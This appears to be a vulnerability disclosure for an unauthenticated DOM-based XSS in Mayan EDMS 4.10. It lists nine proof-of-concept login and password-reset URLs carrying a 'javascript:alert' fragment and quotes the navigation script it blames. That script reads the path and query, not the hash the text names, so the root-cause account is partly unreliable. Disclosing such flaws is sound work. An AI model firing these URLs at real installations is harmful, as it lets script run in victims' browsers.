Mayan EDMS – DOM-Based XSS Vulnerability (Unauthenticated), Version 4.10 (latest)

A DOM-based Cross-Site Scripting (XSS) vulnerability was discovered in Mayan EDMS.
The application reflects user-controlled data directly into a JavaScript context without sanitization, allowing an attacker to execute arbitrary JavaScript in the victim’s browser.

The vulnerability is unauthenticated, meaning that an attacker only needs to trick a victim into opening a malicious URL.

The issue occurs due to insecure handling of window.location inside client-side JavaScript templates.

Affected Endpoints

http://192.168.138.108/authentication/login/#javascript:alert("XSS")

http://192.168.138.108/authentication/password/reset/#javascript:alert("XSS")

http://192.168.138.108/authentication/login/?next=/search/advanced/#javascript:alert("XSS")

http://192.168.138.108/authentication/login/?next=/checkouts/#javascript:alert("XSS")

http://192.168.138.108/authentication/login/?next=/#javascript:alert("XSS")

http://192.168.138.108/authentication/login/?next=/home/#javascript:alert("XSS")

http://192.168.138.108/authentication/password/reset/done/#javascript:alert("XSS")

http://192.168.138.108/authentication/login/?next=/search/advanced/%3F_search_model_pk%3Ddocuments.documentsearchresult/#javascript:alert("XSS")

http://192.168.138.108/authentication/login/?next=/search/advanced/%3F_search_model_pk%3D/#javascript:alert("XSS")


All endpoints behave the same because they rely on the same vulnerable JavaScript fragment.

Root Cause (Vulnerable Code)

The vulnerable DOM logic is located in the primary template used for navigation handling:

<script> if (typeof partialNavigation === 'undefined') { document.write('<script type="text/undefined">') const currentLocation = '#' + window.location.pathname + window.location.search; const url = new URL(currentLocation, window.location.origin) window.location = url; } </script>


window.location.hash (fully attacker-controlled) is appended into navigation logic and processed without sanitization, enabling injection and execution of arbitrary JavaScript.
